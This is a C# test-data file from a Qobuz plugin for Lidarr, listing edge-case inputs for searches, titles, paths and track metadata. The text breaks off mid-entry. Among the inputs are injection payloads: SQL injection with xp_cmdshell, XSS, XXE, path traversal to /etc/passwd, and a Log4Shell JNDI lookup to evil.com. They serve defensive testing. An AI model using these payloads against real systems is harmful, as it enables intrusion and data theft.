using System;
using System.Collections.Generic;
using System.Linq;
using Lidarr.Plugin.Qobuzarr.Models;
using Qobuzarr.Tests.Builders;

namespace Qobuzarr.Tests.TestData
{
    /// <summary>
    /// Centralized collection of edge case test data for comprehensive testing across the plugin.
    /// Contains real-world scenarios, boundary conditions, malformed data, and stress test cases.
    /// All data is designed to match actual plugin interfaces and models.
    /// </summary>
    public static class EdgeCaseData
    {
        #region Search Edge Cases

        /// <summary>
        /// Search queries that represent real-world edge cases and boundary conditions
        /// </summary>
        public static IEnumerable<object[]> SearchQueryEdgeCases =>
            new List<object[]>
            {
                // Empty and whitespace cases
                new object[] { "", "EmptyQuery" },
                new object[] { "   ", "WhitespaceOnlyQuery" },
                new object[] { "\t\n\r", "ControlCharacterQuery" },
                
                // Unicode and international characters
                new object[] { "Björk", "NordicCharacters" },
                new object[] { "Sigur Rós", "AccentedCharacters" },
                new object[] { "Родина", "CyrillicScript" },
                new object[] { "久石譲", "JapaneseCharacters" },
                new object[] { "王菲", "ChineseCharacters" },
                new object[] { "أم كلثوم", "ArabicScript" },
                new object[] { "भीमसेन जोशी", "DevanagariScript" },
                new object[] { "მზე შინა", "GeorgianScript" },
                
                // Emoji and special symbols
                new object[] { "🎵 Music", "EmojiInQuery" },
                new object[] { "AC⚡DC", "ElectricalSymbol" },
                new object[] { "Queensrÿche", "UmlautInBandName" },
                new object[] { "Mötley Crüe", "MultipleUmlauts" },
                
                // Punctuation and special characters
                new object[] { "Panic! At The Disco", "ExclamationMark" },
                new object[] { "System of a Down", "PrepositionsAndArticles" },
                new object[] { "N.W.A", "Abbreviations" },
                new object[] { "Wu-Tang Clan", "Hyphenated" },
                new object[] { "Bell & Sebastian", "Ampersand" },
                new object[] { "Love/Hate", "ForwardSlash" },
                new object[] { "AC\\DC", "BackslashCharacter" },
                new object[] { "Questions?", "QuestionMark" },
                new object[] { "Dots...And...More", "MultipleEllipses" },
                new object[] { "Band (Live)", "Parentheses" },
                new object[] { "[Band Name]", "SquareBrackets" },
                new object[] { "{Curly}", "CurlyBraces" },
                new object[] { "Less<Than", "AngleBrackets" },
                new object[] { "Pipe|Character", "PipeCharacter" },
                new object[] { "Quote\"Mark", "DoubleQuote" },
                new object[] { "Apostrophe's", "Apostrophe" },
                
                // Length edge cases
                new object[] { "A", "SingleCharacter" },
                new object[] { "AB", "TwoCharacters" },
                new object[] { new string('A', 100), "VeryLongQuery" },
                new object[] { new string('X', 255), "MaximumLengthQuery" },
                new object[] { new string('Z', 1000), "ExtremelyLongQuery" },
                
                // Numeric and alphanumeric patterns
                new object[] { "1234567890", "AllNumeric" },
                new object[] { "Band123", "AlphanumericMixed" },
                new object[] { "123Band", "NumberPrefix" },
                new object[] { "Band321End", "NumberSuffix" },
                new object[] { "50 Cent", "NumberInName" },
                new object[] { "2Pac", "NumberPrefix" },
                new object[] { "Blink-182", "NumberSuffix" },
                new object[] { "Sum 41", "NumberWithSpace" },
                new object[] { "7-11", "NumbersWithHyphen" },
                
                // Case sensitivity variations
                new object[] { "ALLUPPERCASE", "AllUppercase" },
                new object[] { "alllowercase", "AllLowercase" },
                new object[] { "MiXeD cAsE", "MixedCase" },
                new object[] { "CamelCase", "CamelCase" },
                new object[] { "snake_case", "SnakeCase" },
                new object[] { "kebab-case", "KebabCase" },
                
                // Common search patterns
                new object[] { "The Beatles", "CommonBandName" },
                new object[] { "Various Artists", "VariousArtists" },
                new object[] { "Unknown Artist", "UnknownArtist" },
                new object[] { "Soundtrack", "SoundtrackQuery" },
                new object[] { "Greatest Hits", "GreatestHits" },
                new object[] { "Best Of", "BestOfCompilation" },
                new object[] { "Live Album", "LiveAlbum" },
                new object[] { "Studio Album", "StudioAlbum" },
                new object[] { "Acoustic", "AcousticVersion" },
                new object[] { "Remix", "RemixVersion" },
                new object[] { "Remastered", "RemasteredVersion" },
                new object[] { "Deluxe Edition", "DeluxeEdition" },
                new object[] { "Special Edition", "SpecialEdition" },
                new object[] { "Extended Play", "EPTerm" },
                new object[] { "Single", "SingleRelease" },
                
                // Genre-specific edge cases
                new object[] { "Classical Symphony", "ClassicalMusic" },
                new object[] { "Jazz Quartet", "JazzMusic" },
                new object[] { "Electronic Dance Music", "EDMGenre" },
                new object[] { "Heavy Metal", "MetalGenre" },
                new object[] { "Hip Hop", "HipHopGenre" },
                new object[] { "Country Music", "CountryGenre" },
                new object[] { "World Music", "WorldMusicGenre" },
                new object[] { "Folk Music", "FolkGenre" },
                
                // Format and quality terms
                new object[] { "FLAC", "AudioFormat" },
                new object[] { "Hi-Res", "HighResolution" },
                new object[] { "24-bit", "BitDepthTerm" },
                new object[] { "192kHz", "SampleRateTerm" },
                new object[] { "DSD", "DSDFormat" },
                new object[] { "MQA", "MQAFormat" },
                
                // Year and decade patterns
                new object[] { "1960s", "DecadePattern" },
                new object[] { "2000s Music", "RecentDecade" },
                new object[] { "90s Hits", "NinetiesHits" },
                new object[] { "2023", "SpecificYear" },
                new object[] { "1970-1979", "YearRange" },
                
                // Potential injection patterns (should be safely handled)
                new object[] { "'; DROP TABLE albums; --", "SQLInjectionPattern" },
                new object[] { "<script>alert('xss')</script>", "XSSPattern" },
                new object[] { "../../../etc/passwd", "PathTraversalPattern" },
                new object[] { "${jndi:ldap://evil.com/a}", "LogShellPattern" },
                new object[] { "%00", "NullBytePattern" },
                new object[] { "\0", "NullCharacterPattern" },
                
                // Common typos and misspellings
                new object[] { "Beattles", "CommonTypo" },
                new object[] { "Led Zeplin", "SpellingError" },
                new object[] { "Qeen", "MissingLetter" },
                new object[] { "Rollingg Stones", "ExtraLetter" },
                new object[] { "Bneatles", "TransposedLetters" },
                
                // Search modifiers and operators
                new object[] { "artist:Beatles", "ArtistModifier" },
                new object[] { "album:\"Abbey Road\"", "AlbumModifier" },
                new object[] { "genre:rock", "GenreModifier" },
                new object[] { "year:1969", "YearModifier" },
                new object[] { "+required -excluded", "BooleanOperators" },
                new object[] { "\"exact phrase\"", "ExactPhrase" },
                new object[] { "wild*card", "WildcardPattern" },
                
                // Multi-word edge cases
                new object[] { "The The", "RepeatedWords" },
                new object[] { "A A A", "RepeatedSingleLetter" },
                new object[] { "And And And", "RepeatedConjunction" },
                new object[] { "Of Of Of", "RepeatedPreposition" },
                
                // Streaming and availability terms
                new object[] { "Available", "AvailabilityTerm" },
                new object[] { "Streamable", "StreamableTerm" },
                new object[] { "Downloadable", "DownloadableTerm" },
                new object[] { "Hi-Res Available", "QualityAvailability" },
                
                // Language mixing
                new object[] { "Los Beatles", "SpanishMixed" },
                new object[] { "Les Beatles", "FrenchMixed" },
                new object[] { "Die Beatles", "GermanMixed" },
                new object[] { "Il Beatles", "ItalianMixed" },
                
                // Technical terms
                new object[] { "Mono", "MonoRecording" },
                new object[] { "Stereo", "StereoRecording" },
                new object[] { "Surround", "SurroundSound" },
                new object[] { "Binaural", "BinauralRecording" },
                new object[] { "Ambisonic", "AmbisonicAudio" }
            };

        #endregion

        #region Album Title Edge Cases

        /// <summary>
        /// Album titles with various edge cases for metadata handling
        /// </summary>
        public static IEnumerable<object[]> AlbumTitleEdgeCases =>
            new List<object[]>
            {
                // Length variations
                new object[] { "", "EmptyAlbumTitle" },
                new object[] { "A", "SingleCharacterTitle" },
                new object[] { new string('M', 200), "VeryLongTitle" },
                
                // Special editions and versions
                new object[] { "Album (Deluxe Edition)", "DeluxeEdition" },
                new object[] { "Album [Remastered]", "RemasteredBrackets" },
                new object[] { "Album - Expanded Edition", "ExpandedEdition" },
                new object[] { "Album (Live at Venue)", "LiveVenue" },
                new object[] { "Album: The Definitive Collection", "DefinitiveCollection" },
                
                // Multi-disc and box sets
                new object[] { "Complete Works (Disc 1)", "MultiDiscSet" },
                new object[] { "Box Set: The Collection", "BoxSetTitle" },
                new object[] { "Anthology 1-3", "AnthologyRange" },
                
                // Soundtrack and compilation patterns
                new object[] { "Movie Soundtrack", "MovieSoundtrack" },
                new object[] { "Original Cast Recording", "CastRecording" },
                new object[] { "Various Artists Compilation", "VACompilation" },
                
                // Date and year patterns in titles
                new object[] { "Live 1969", "YearInTitle" },
                new object[] { "Sessions 1970-1975", "YearRangeInTitle" },
                new object[] { "December 1963", "MonthYearInTitle" },
                
                // File system problematic characters
                new object[] { "Album/Title", "ForwardSlashInTitle" },
                new object[] { "Album\\Title", "BackslashInTitle" },
                new object[] { "Album:Title", "ColonInTitle" },
                new object[] { "Album*Title", "AsteriskInTitle" },
                new object[] { "Album?Title", "QuestionMarkInTitle" },
                new object[] { "Album\"Title", "QuoteInTitle" },
                new object[] { "Album<Title>", "AngleBracketsInTitle" },
                new object[] { "Album|Title", "PipeInTitle" },
                
                // Unicode and international titles
                new object[] { "Álbum Español", "SpanishTitle" },
                new object[] { "Album Français", "FrenchTitle" },
                new object[] { "Deutsches Album", "GermanTitle" },
                new object[] { "Альбом", "CyrillicTitle" },
                new object[] { "アルバム", "JapaneseTitle" },
                new object[] { "专辑", "ChineseTitle" }
            };

        #endregion

        #region Artist Name Edge Cases

        /// <summary>
        /// Artist names with various formatting and character challenges
        /// </summary>
        public static IEnumerable<object[]> ArtistNameEdgeCases =>
            new List<object[]>
            {
                // Single vs multiple artist scenarios
                new object[] { "", "EmptyArtistName" },
                new object[] { "Solo Artist", "SingleArtist" },
                new object[] { "Artist feat. Guest", "FeaturingGuest" },
                new object[] { "Artist & Artist", "AmpersandCollaboration" },
                new object[] { "Artist, Artist, Artist", "MultipleCommaArtists" },
                new object[] { "Artist vs Artist", "VersusCollaboration" },
                new object[] { "Artist with Orchestra", "WithOrchestra" },
                
                // Name formatting variations
                new object[] { "LastName, FirstName", "LastNameFirst" },
                new object[] { "First Middle Last", "FullName" },
                new object[] { "Artist Jr.", "JuniorSuffix" },
                new object[] { "Dr. Artist", "TitlePrefix" },
                new object[] { "Artist III", "RomanNumeralSuffix" },
                
                // Band vs solo distinctions
                new object[] { "The Band", "ThePrefix" },
                new object[] { "Band The", "TheSuffix" },
                new object[] { "A Band", "APrefix" },
                new object[] { "An Artist", "AnPrefix" },
                
                // Special characters in names
                new object[] { "Mot&ouml;rhead", "HTMLEntity" },
                new object[] { "Artist's Name", "Possessive" },
                new object[] { "O'Connor", "Apostrophe" },
                new object[] { "Jean-Luc", "Hyphenated" },
                new object[] { "d'Artagnan", "FrenchApostrophe" },
                
                // Pseudonyms and stage names
                new object[] { "Artist aka Alias", "AlsoKnownAs" },
                new object[] { "Real Name (Artist Name)", "StageName" },
                new object[] { "The Former Artist", "FormerName" },
                
                // Classical and orchestral
                new object[] { "London Symphony Orchestra", "Orchestra" },
                new object[] { "String Quartet No. 1", "ChamberGroup" },
                new object[] { "Conductor, Orchestra", "ConductorOrchestra" },
                
                // International variations
                new object[] { "MC Artist", "MCPrefix" },
                new object[] { "DJ Artist", "DJPrefix" },
                new object[] { "Producer ft. Vocalist", "ProducerFeature" }
            };

        #endregion

        #region Track Title Edge Cases

        /// <summary>
        /// Track titles with various formatting challenges
        /// </summary>
        public static IEnumerable<object[]> TrackTitleEdgeCases =>
            new List<object[]>
            {
                // Track numbering variations
                new object[] { "01. Track Title", "NumberedTrack" },
                new object[] { "Track 1", "TrackNumberInTitle" },
                new object[] { "1-01 Track", "DiscTrackNumber" },
                new object[] { "A1. Track", "SideTrackNumber" },
                
                // Version and remix indicators
                new object[] { "Track (Radio Edit)", "RadioEdit" },
                new object[] { "Track (Extended Version)", "ExtendedVersion" },
                new object[] { "Track (Acoustic)", "AcousticVersion" },
                new object[] { "Track (Live)", "LiveVersion" },
                new object[] { "Track (Demo)", "DemoVersion" },
                new object[] { "Track (Instrumental)", "InstrumentalVersion" },
                new object[] { "Track (Remix)", "RemixVersion" },
                new object[] { "Track (Radio Mix)", "RadioMix" },
                new object[] { "Track (Club Mix)", "ClubMix" },
                
                // Duration indicators
                new object[] { "Track (3:45)", "DurationInTitle" },
                new object[] { "Track [Short Version]", "ShortVersion" },
                new object[] { "Track [Long Version]", "LongVersion" },
                
                // Classical music specifics
                new object[] { "Symphony No. 1 in C major", "ClassicalWork" },
                new object[] { "Sonata Op. 27 No. 2", "OpusNumber" },
                new object[] { "Movement I: Allegro", "MovementTitle" },
                new object[] { "Concerto in D minor, BWV 1052", "BWVNumber" },
                
                // Multi-part tracks
                new object[] { "Track Part I", "MultiPartTrack" },
                new object[] { "Track (Intro)", "IntroTrack" },
                new object[] { "Track (Outro)", "OutroTrack" },
                new object[] { "Track (Interlude)", "InterludeTrack" },
                
                // Language and encoding issues
                new object[] { "Caf\u00e9", "AccentedCharacters" },
                new object[] { "Ma\u00f1ana", "SpanishCharacters" },
                new object[] { "R\u00e9sum\u00e9", "FrenchCharacters" },
                
                // Problematic characters for filenames
                new object[] { "Track: Subtitle", "ColonInTrackTitle" },
                new object[] { "Track/Subtitle", "SlashInTrackTitle" },
                new object[] { "Track\"Quote", "QuoteInTrackTitle" },
                new object[] { "Track*Wild", "AsteriskInTrackTitle" }
            };

        #endregion

        #region Quality and Format Edge Cases

        /// <summary>
        /// Audio quality and format specifications for edge case testing
        /// </summary>
        public static IEnumerable<object[]> AudioQualityEdgeCases =>
            new List<object[]>
            {
                // Standard quality levels
                new object[] { 16, 44100.0, "CDQuality" },
                new object[] { 24, 48000.0, "StudioQuality" },
                new object[] { 24, 96000.0, "HighRes96" },
                new object[] { 24, 192000.0, "HighRes192" },
                new object[] { 32, 384000.0, "ExtremeQuality" },
                
                // Edge cases for quality
                new object[] { 0, 0.0, "InvalidQuality" },
                new object[] { -1, -1.0, "NegativeQuality" },
                new object[] { 1, 1.0, "MinimalQuality" },
                new object[] { 64, 1000000.0, "ExcessiveQuality" },
                
                // Unusual but valid combinations
                new object[] { 20, 88200.0, "UnusualCombination1" },
                new object[] { 18, 176400.0, "UnusualCombination2" },
                new object[] { 22, 352800.0, "UnusualCombination3" }
            };

        #endregion

        #region Date and Time Edge Cases

        /// <summary>
        /// Date and timestamp edge cases for release dates and metadata
        /// </summary>
        public static IEnumerable<object[]> DateTimeEdgeCases =>
            new List<object[]>
            {
                // Historical dates
                new object[] { new DateTime(1900, 1, 1), "EarlyTwentiethCentury" },
                new object[] { new DateTime(1950, 12, 31), "MidTwentiethCentury" },
                new object[] { new DateTime(1969, 8, 15), "WoodstockEra" },
                new object[] { new DateTime(1977, 6, 16), "PunkEra" },
                new object[] { new DateTime(1991, 9, 24), "GrungeEra" },
                
                // Edge dates
                new object[] { DateTime.MinValue, "MinimumDate" },
                new object[] { DateTime.MaxValue, "MaximumDate" },
                new object[] { new DateTime(2000, 1, 1), "Y2KDate" },
                new object[] { new DateTime(2038, 1, 19), "Unix32BitLimit" },
                
                // Leap year dates
                new object[] { new DateTime(2000, 2, 29), "LeapYearDate" },
                new object[] { new DateTime(1900, 2, 28), "NonLeapCentury" },
                
                // Future dates
                new object[] { DateTime.Now.AddYears(1), "FutureRelease" },
                new object[] { DateTime.Now.AddYears(10), "DistantFuture" },
                
                // Common release patterns
                new object[] { new DateTime(2023, 1, 1), "NewYearRelease" },
                new object[] { new DateTime(2023, 12, 25), "ChristmasRelease" },
                new object[] { new DateTime(2023, 10, 31), "HalloweenRelease" }
            };

        #endregion

        #region File Path and Name Edge Cases

        /// <summary>
        /// File system path and naming edge cases
        /// </summary>
        public static IEnumerable<object[]> FilePathEdgeCases =>
            new List<object[]>
            {
                // Path length variations
                new object[] { "short.flac", "ShortFilename" },
                new object[] { new string('a', 100) + ".flac", "LongFilename" },
                new object[] { new string('x', 255) + ".flac", "MaxLengthFilename" },
                
                // Extension variations
                new object[] { "track.flac", "FLACExtension" },
                new object[] { "track.mp3", "MP3Extension" },
                new object[] { "track.wav", "WAVExtension" },
                new object[] { "track.m4a", "M4AExtension" },
                new object[] { "track.FLAC", "UppercaseExtension" },
                new object[] { "track.Flac", "MixedCaseExtension" },
                new object[] { "track", "NoExtension" },
                new object[] { "track.", "EmptyExtension" },
                new object[] { "track.multiple.extensions.flac", "MultipleExtensions" },
                
                // Special characters in paths
                new object[] { "path with spaces.flac", "SpacesInPath" },
                new object[] { "path-with-hyphens.flac", "HyphensInPath" },
                new object[] { "path_with_underscores.flac", "UnderscoresInPath" },
                new object[] { "path.with.dots.flac", "DotsInPath" },
                new object[] { "path(with)parentheses.flac", "ParenthesesInPath" },
                new object[] { "path[with]brackets.flac", "BracketsInPath" },
                new object[] { "path{with}braces.flac", "BracesInPath" },
                
                // Unicode in filenames
                new object[] { "tráck.flac", "AccentedFilename" },
                new object[] { "трек.flac", "CyrillicFilename" },
                new object[] { "曲目.flac", "ChineseFilename" },
                new object[] { "🎵track.flac", "EmojiInFilename" },
                
                // Directory structures
                new object[] { @"Artist\Album\01 Track.flac", "StandardStructure" },
                new object[] { @"Various Artists\Compilation\Disc 1\Track.flac", "MultiDiscStructure" },
                new object[] { @"Classical\Composer\Work\Movement.flac", "ClassicalStructure" }
            };

        #endregion

        #region Network and API Edge Cases

        /// <summary>
        /// Network conditions and API response edge cases
        /// </summary>
        public static IEnumerable<object[]> NetworkEdgeCases =>
            new List<object[]>
            {
                // Response size variations
                new object[] { 0, "EmptyResponse" },
                new object[] { 1, "MinimalResponse" },
                new object[] { 1024, "SmallResponse" },
                new object[] { 1024 * 1024, "LargeResponse" },
                new object[] { 10 * 1024 * 1024, "VeryLargeResponse" },
                
                // Timeout scenarios
                new object[] { 1, "VeryShortTimeout" },
                new object[] { 30, "ShortTimeout" },
                new object[] { 300, "LongTimeout" },
                new object[] { 3600, "VeryLongTimeout" },
                
                // Rate limiting scenarios
                new object[] { 1, "VerySlowRate" },
                new object[] { 10, "SlowRate" },
                new object[] { 60, "NormalRate" },
                new object[] { 600, "FastRate" },
                new object[] { 6000, "VeryFastRate" }
            };

        #endregion

        #region Metadata Edge Cases

        /// <summary>
        /// Complex metadata scenarios for comprehensive testing
        /// </summary>
        public static IEnumerable<QobuzTrack> MetadataEdgeCases =>
            new List<QobuzTrack>
            {
                // Minimal metadata
                QobuzTrackBuilder.New()
                    .WithId("minimal")
                    .WithTitle("Track")
                    .Build(),
                
                // Maximum metadata
                QobuzTrackBuilder.New()
                    .WithId("maximal")
                    .WithTitle("Very Long Track Title With Many Words And Details")
                    .WithPerformer("Complex Artist Name With Special Characters & Symbols")
                    .WithComposer("Famous Classical Composer")
                    .WithTrackNumber(99)
                    .WithDiscNumber(5)
                    .WithDuration(3600) // 1 hour
                    .WithQuality(32, 384000)
                    .AsHiResFlac()
                    .Build(),
                
                // Unicode and international metadata
                QobuzTrackBuilder.New()
                    .WithId("unicode")
                    .WithTitle("Café de Flore")
                    .WithPerformer("Björk")
                    .WithComposer("Владимир")
                    .Build(),
                
                // Classical music metadata
                QobuzTrackBuilder.New()
                    .WithId("classical")
                    .AsClassical("Ludwig van Beethoven", "Symphony No. 9", "IV. Finale")
                    .WithDuration(1200)
                    .Build(),
                
                // Edge case track numbers
                QobuzTrackBuilder.New()
                    .WithId("edge_numbers")
                    .WithTrackNumber(0)
                    .WithDiscNumber(0)
                    .Build(),
                
                // Sample/preview track
                QobuzTrackBuilder.New()
                    .WithId("sample")
                    .WithTitle("Sample Track")
                    .AsSampleOnly()
                    .WithDuration(30)
                    .Build(),
                
                // Not streamable/downloadable
                QobuzTrackBuilder.New()
                    .WithId("restricted")
                    .WithTitle("Restricted Track")
                    .AsNotStreamable()
                    .AsNotDownloadable()
                    .Build()
            };

        #endregion

        #region Boundary Value Cases

        /// <summary>
        /// Boundary values for numerical parameters
        /// </summary>
        public static IEnumerable<object[]> BoundaryValues =>
            new List<object[]>
            {
                // Integer boundaries
                new object[] { int.MinValue, "IntegerMinValue" },
                new object[] { int.MaxValue, "IntegerMaxValue" },
                new object[] { 0, "Zero" },
                new object[] { 1, "One" },
                new object[] { -1, "NegativeOne" },
                
                // Common music-related boundaries
                new object[] { 44100, "CDSampleRate" },
                new object[] { 48000, "StudioSampleRate" },
                new object[] { 96000, "HighResSampleRate" },
                new object[] { 192000, "UltraHighResSampleRate" },
                
                // Duration boundaries (seconds)
                new object[] { 1, "OneSecond" },
                new object[] { 60, "OneMinute" },
                new object[] { 180, "ThreeMinutes" },
                new object[] { 300, "FiveMinutes" },
                new object[] { 600, "TenMinutes" },
                new object[] { 3600, "OneHour" },
                
                // File size boundaries (bytes)
                new object[] { 1024, "OneKB" },
                new object[] { 1048576, "OneMB" },
                new object[] { 1073741824, "OneGB" }
            };

        #endregion

        #region 🐒 CHAOS MONKEY EDGE CASES 🐒

        /// <summary>
        /// Chaos monkey search queries designed to break things in creative ways
        /// </summary>
        public static IEnumerable<object[]> ChaosMonkeySearchQueries =>
            new List<object[]>
            {
                // Memory exhaustion attempts
                new object[] { new string('A', int.MaxValue / 1000), "MassiveMemoryQuery" },
                new object[] { string.Join("", Enumerable.Repeat("LongWord", 100000)), "RepeatedWordMemoryBomb" },
                new object[] { string.Concat(Enumerable.Repeat("🎵", 50000)), "EmojiMemoryBomb" },
                
                // Stack overflow attempts
                new object[] { new string('(', 10000) + new string(')', 10000), "DeepNestingStackOverflow" },
                new object[] { string.Join("", Enumerable.Repeat("((()))", 5000)), "RecursiveParenthesesBomb" },
                
                // Regex DoS attempts (ReDoS)
                new object[] { "a" + new string('a', 1000) + new string('a', 1000) + "X", "RegexBacktrackingBomb" },
                new object[] { new string('a', 5000) + "!" + new string('b', 5000), "AlternationRegexBomb" },
                new object[] { "(a+)+b" + new string('a', 1000), "NestedQuantifierBomb" },
                
                // Unicode chaos
                new object[] { "\uFEFF\uFFFE\uFFFF", "UnicodeBOMChaos" },
                new object[] { "test\u0000\u0001\u0002\u0003\u0004\u0005", "ControlCharacterChaos" },
                new object[] { "\u202E\u202D\u202C\u202B\u202A", "BidirectionalOverrideChaos" },
                new object[] { "\u200B\u200C\u200D\u2060\uFEFF", "InvisibleCharacterChaos" },
                new object[] { "𝕋𝕙𝕚𝕤 𝕚𝕤 𝔞 𝕥𝕖𝕤𝕥", "MathematicalAlphanumericChaos" },
                new object[] { "🤖🔥💥⚡🌪️🌊❄️🔥💨", "EmoticonOverloadChaos" },
                
                // Encoding chaos
                new object[] { "test\xFF\xFE\x00\x00", "InvalidUTF8Bytes" },
                new object[] { "тест" + "\uD800\uDC00" + "test", "SurrogatePairChaos" },
                new object[] { "\uD800\uD800\uDC00\uDC00", "BrokenSurrogatePairs" },
                
                // JSON injection chaos
                new object[] { "\"},\"malicious\":\"payload\",\"query\":\"", "JSONInjectionAttempt" },
                new object[] { "\\u0000\\u0001\\u0002", "JSONEscapeChaos" },
                new object[] { "\"},alert('xss'),{\"q\":\"", "JavaScriptInjectionAttempt" },
                
                // SQL chaos (even though we don't use SQL directly)
                new object[] { "'; WAITFOR DELAY '00:00:10'; --", "SQLTimingAttack" },
                new object[] { "' OR '1'='1' OR '", "SQLTautology" },
                new object[] { "'; EXEC xp_cmdshell('dir'); --", "SQLCommandInjection" },
                new object[] { "UNION SELECT * FROM users--", "SQLUnionAttack" },
                
                // Format string chaos
                new object[] { "%s%s%s%s%s%s%s%s%s%s", "FormatStringBomb" },
                new object[] { "{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}", "DotNetFormatStringChaos" },
                new object[] { "{{{{{{{{{{", "EscapedBraceChaos" },
                
                // Path traversal chaos
                new object[] { "../../../../../../../etc/passwd", "UnixPathTraversal" },
                new object[] { "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "WindowsPathTraversal" },
                new object[] { "%2e%2e%2f%2e%2e%2f%2e%2e%2f", "URLEncodedPathTraversal" },
                new object[] { "....//....//....//", "DoubleSlashTraversal" },
                
                // URL chaos
                new object[] { "javascript:alert('xss')", "JavaScriptURL" },
                new object[] { "data:text/html,<script>alert('xss')</script>", "DataURL" },
                new object[] { "file:///etc/passwd", "FileURL" },
                new object[] { "ftp://malicious.com/", "FTPProtocol" },
                
                // XML/HTML chaos
                new object[] { "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "XXEAttack" },
                new object[] { "<img src=x onerror=alert('xss')>", "XSSAttack" },
                new object[] { "<!--[if IE]><script>alert('xss')</script><![endif]-->", "ConditionalComment" },
                
                // Number chaos
                new object[] { "1e308", "FloatingPointOverflow" },
                new object[] { "1.7976931348623157e+308", "DoubleMaxValue" },
                new object[] { "-1.7976931348623157e+308", "DoubleMinValue" },
                new object[] { "NaN", "NotANumberString" },
                new object[] { "Infinity", "InfinityString" },
                new object[] { "-Infinity", "NegativeInfinityString" },
                
                // Time chaos
                new object[] { "1970-01-01T00:00:00Z", "UnixEpoch" },
                new object[] { "9999-12-31T23:59:59Z", "FarFutureDate" },
                new object[] { "0000-01-01T00:00:00Z", "YearZero" },
                new object[] { "2038-01-19T03:14:07Z", "Unix32BitOverflow" },
                
                // Compression bomb attempts (text-based)
                new object[] { new string('A', 1000) + new string('B', 1000) + new string('C', 1000), "TextCompressionBomb" },
                
                // Protocol confusion
                new object[] { "http://evil.com@legitimate.com/", "URLConfusion" },
                new object[] { "https://192.168.1.1:8080@evil.com/", "IPSpoofing" },
                
                // Resource exhaustion patterns
                new object[] { string.Join(" ", Enumerable.Range(0, 10000).Select(i => $"word{i}")), "TokenExhaustionBomb" },
                new object[] { string.Join("", Enumerable.Repeat("((", 1000)) + string.Join("", Enumerable.Repeat("))", 1000)), "NestedStructureBomb" },
                
                // Cryptographic chaos
                new object[] { "00000000000000000000000000000000", "AllZeroHash" },
                new object[] { "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF", "AllOneHash" },
                new object[] { "deadbeefdeadbeefdeadbeefdeadbeef", "DeadBeefPattern" },
                
                // Network confusion
                new object[] { "127.0.0.1", "LocalhostIP" },
                new object[] { "0.0.0.0", "NullRoute" },
                new object[] { "255.255.255.255", "BroadcastAddress" },
                new object[] { "169.254.0.1", "LinkLocalAddress" },
                
                // API abuse patterns
                new object[] { string.Join("&", Enumerable.Range(0, 1000).Select(i => $"param{i}=value{i}")), "ParameterPollution" },
                
                // Timing attack patterns
                new object[] { new string('A', 1) + new string('A', 10) + new string('A', 100), "TimingAttackGradient" },
                
                // Character encoding edge cases
                new object[] { "café" + "\u0301", "CombiningCharacterChaos" }, // é as e + combining acute
                new object[] { "a\u0300\u0301\u0302\u0303\u0304", "MultipleCombiningMarks" },
                
                // Zero-width chaos
                new object[] { "a\u200Bb\u200Cc\u200Dd", "ZeroWidthCharacterSeparation" },
                new object[] { "\u2063\u2062\u2061", "InvisibleSeparators" },
                
                // MIME type confusion
                new object[] { "Content-Type: application/javascript", "MIMETypeInjection" },
                
                // Case sensitivity chaos
                new object[] { "TEST" + char.ToLower('T') + "est", "MixedCasePattern" },
                
                // Normalization chaos
                new object[] { "Ǎ", "PrecomposedCharacter" }, // A with caron
                new object[] { "A\u030C", "DecomposedCharacter" }, // A + combining caron
                
                // Binary data disguised as text
                new object[] { Convert.ToBase64String(new byte[] { 0xFF, 0xFE, 0xFD, 0xFC }), "Base64BinaryData" },
                
                // Zip bomb attempt (textual)
                new object[] { new string('0', 10000), "UniformTextBomb" },
                
                // International domain name chaos
                new object[] { "xn--e1afmkfd.xn--p1ai", "PunycodeIDN" }, // пример.рф in punycode
                
                // Protocol buffer edge cases
                new object[] { "\x08\x96\x01", "ProtocolBufferData" },
                
                // Hash collision attempts
                new object[] { "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89", "MD5CollisionAttempt" },
                
                // Steganography markers
                new object[] { "‌‍⁡⁢⁣⁤", "SteganographicMarkers" },
                
                // Font/rendering chaos
                new object[] { "𝒜𝒷𝒸𝒹ℯ𝒻ℊ", "ScriptFontVariants" },
                new object[] { "ａｂｃｄｅ", "FullwidthCharacters" }
            };

        /// <summary>
        /// Chaos monkey metadata scenarios designed to test resource limits
        /// </summary>
        public static IEnumerable<QobuzTrack> ChaosMonkeyMetadata =>
            new List<QobuzTrack>
            {
                // Memory exhaustion track
                QobuzTrackBuilder.New()
                    .WithId("memory_bomb")
                    .WithTitle(new string('M', 100000)) // 100KB title
                    .WithPerformer(new string('P', 50000)) // 50KB performer
                    .WithComposer(new string('C', 50000)) // 50KB composer
                    .WithDuration(int.MaxValue) // Maximum duration
                    .Build(),
                
                // Unicode chaos track
                QobuzTrackBuilder.New()
                    .WithId("unicode_chaos")
                    .WithTitle("🎵🎶🎼🎤🎧🎯🔥💥⚡🌪️" + "\u202E" + "REVERSED" + "\u202C")
                    .WithPerformer("\uFEFF" + "Hidden Artist" + "\u200B")
                    .Build(),
                
                // Null/control character track
                QobuzTrackBuilder.New()
                    .WithId("control_chaos")
                    .WithTitle("Track\u0000With\u0001Nulls\u0002")
                    .WithPerformer("Artist\u0007\u0008\u0009")
                    .Build(),
                
                // Extreme quality values
                QobuzTrackBuilder.New()
                    .WithId("quality_chaos")
                    .WithTitle("Quality Chaos")
                    .WithQuality(int.MaxValue, double.MaxValue)
                    .WithDuration(-1) // Negative duration
                    .Build(),
                
                // Negative track numbers
                QobuzTrackBuilder.New()
                    .WithId("negative_track")
                    .WithTitle("Negative Track")
                    .WithTrackNumber(-999)
                    .WithDiscNumber(-100)
                    .Build(),
                
                // Zero values everywhere
                QobuzTrackBuilder.New()
                    .WithId("zero_track")
                    .WithTitle("")
                    .WithTrackNumber(0)
                    .WithDiscNumber(0)
                    .WithDuration(0)
                    .WithQuality(0, 0)
                    .Build(),
                
                // Format string injection track
                QobuzTrackBuilder.New()
                    .WithId("format_injection")
                    .WithTitle("{0}{1}{2}%s%d%x")
                    .WithPerformer("Artist {0}")
                    .Build(),
                
                // Path injection track
                QobuzTrackBuilder.New()
                    .WithId("path_injection")
                    .WithTitle("../../../../../../etc/passwd")
                    .WithPerformer("..\\..\\windows\\system32")
                    .Build(),
                
                // Script injection track
                QobuzTrackBuilder.New()
